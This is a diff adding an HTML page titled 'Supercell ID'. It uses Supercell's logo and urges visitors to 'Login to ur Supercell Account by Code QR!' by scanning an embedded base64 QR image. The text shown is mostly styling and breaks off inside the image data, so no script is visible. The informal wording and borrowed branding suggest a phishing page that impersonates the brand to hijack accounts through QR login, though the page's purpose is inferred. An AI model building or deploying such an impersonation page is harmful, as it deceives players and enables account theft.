@@ -1,1 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Supercell ID</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
+    body {
+      background-image: url('https://i.redd.it/iapqmzd3zu721.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      margin: 0;
+      font-family: sans-serif;
+      color: white;
+      /* Usunięcie cienia tekstu */
+      transition: background-color 0.3s ease, color 0.3s ease;
+
+    }
+
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: #000;
+      color: white;
+      height: 50px;
+      padding: 0 20px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+    }
+
+    .navbar img {
+      height: 30px;
+    }
+
+    .navbar-title {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .login-button {
+      background-color: white;
+      color: black;
+      padding: 10px 20px;
+      border-radius: 5px;
+      font-weight: bold;
+      text-transform: uppercase;
+      cursor: pointer;
+      margin-left: auto;
+      margin-right: 0;
+      border: none;
+      font-size: 14px;
+    }
+
+    .header-title {
+      font-size: 2.3em;
+      text-align: center;
+      margin-top: 70px;
+    }
+
+    .content {
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .box {
+      width: 90%;
+      max-width: 500px;
+      background-color: rgba(255, 255, 255, 0.7);
+      border: 2px solid #ccc;
+      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      backdrop-filter: blur(8px);
+    }
+
+    .qr-code {
+      width: 100%;
+      max-width: 300px;
+      aspect-ratio: 1 / 1;
+      background-color: #f5f5f5;
+      border-radius: 8px;
+      border: 1px solid #333;
+      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .qr-code img {
+      width: 90%;
+      height: 90%;
+      object-fit: contain;
+      border-radius: 6px;
+    }
+
+    .guide, .security-warning, .experiment-note {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 12px;
+      margin: 10px auto;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 600px;
+      font-size: 0.95em;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
+    }
+
+    .security-warning {
+      background-color: #2196f3;
+    }
+
+    .experiment-note {
+      background-color: #ff9800;
+    }
+
+    .guide p {
+      margin: 8px 0;
+    }
+
+    .emoji {
+      margin-right: 8px;
+      font-size: 1.2em;
+    }
+
+    .faq-box {
+      width: 90%;
+      max-width: 600px;
+      background-color: rgba(0, 0, 0, 0.8);
+      border: 2px solid #ccc;
+      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 30px auto;
+    }
+
+    .faq-item {
+      background-color: rgba(255,255,255,0.1);
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .faq-answer {
+      display: none;
+      margin: 8px 0 15px;
+      color: #ddd;
+    }
+
+    .arrow {
+      transition: transform 0.3s ease;
+    }
+
+    .rotate {
+      transform: rotate(180deg);
+    }
+
+    /* News Section */
+    .news-box {
+      width: 90%;
+      max-width: 600px;
+      background-color: rgba(0, 0, 0, 0.85);
+      border-radius: 10px;
+      padding: 20px;
+      margin: 30px auto;
+      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.5);
+    }
+
+    .news-box h2 {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .news-item {
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+    }
+
+    /* Supercell Games Section */
+    .supercell-games {
+      max-width: 1000px;
+      margin: 40px auto;
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .games-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 20px;
+      margin-top: 20px;
+    }
+
+    .game-card {
+      background-color: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 10px;
+    }
+
+    .game-card img {
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .game-card p {
+      margin-top: 10px;
+      font-size: 0.9em;
+      color: #fff;
+      word-break: break-word;
+    }
+
+    /* Social & Store Links Section */
+    .social-links {
+      text-align: center;
+      margin-top: 50px;
+      padding: 20px;
+    }
+
+    .social-links a {
+      color: white;
+      margin: 0 15px;
+      font-size: 1.5em;
+      text-decoration: none;
+    }
+
+    .social-links a:hover {
+      color: #00b0ff;
+    }
+
+    .store-links {
+      display: flex;
+      justify-content: center;
+      margin-top: 30px;
+    }
+
+    .store-links a {
+      margin: 0 20px;
+    }
+
+    .store-links img {
+      width: 120px;
+    }
+
+    /* Footer Section */
+    .footer {
+      background-color: #000;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      position: absolute;
+      bottom: 10;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer .social-media {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .footer .social-media a {
+      margin: 0 10px;
+    }
+
+    .footer .social-media a img {
+      width: 30px;
+    }
+
+    .footer .social-media .address {
+      font-size: 0.85em;
+      color: #fff;
+      margin-left: 20px;
+      font-family: 'Arial', sans-serif;
+    }
+
+    /* New Modal Styling */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background-color: black;
+      color: white;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 1.2em;
+      position: relative;
+    }
+
+    .modal button {
+      margin-top: 20px;
+      background-color: #2196f3;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="navbar">
+    <img src="https://cdn.supercell.com/supercell.com/221213073743/supercell.com/files/media_logo_supercell_white2x.png" alt="Supercell Logo">
+    <div class="navbar-title">Supercell ID</div>
+    <button class="login-button" id="loginBtn">LOG IN</button>
+  </div>
+
+ <div class="header-title" style="
+  font-weight: bold;
+  text-transform: uppercase;
+  font-size: 24px;
+  color: white;
+  text-shadow:
+    -1px -1px 0 black,
+    1px -1px 0 black,
+    -1px 1px 0 black,
+    1px 1px 0 black;
+">
+  Login to ur Supercell Account by Code QR!
+</div>
+
+
+  <div class="content">
+    <div class="box">
+      <div class="qr-code">
+        <img src="data:image/png;base64,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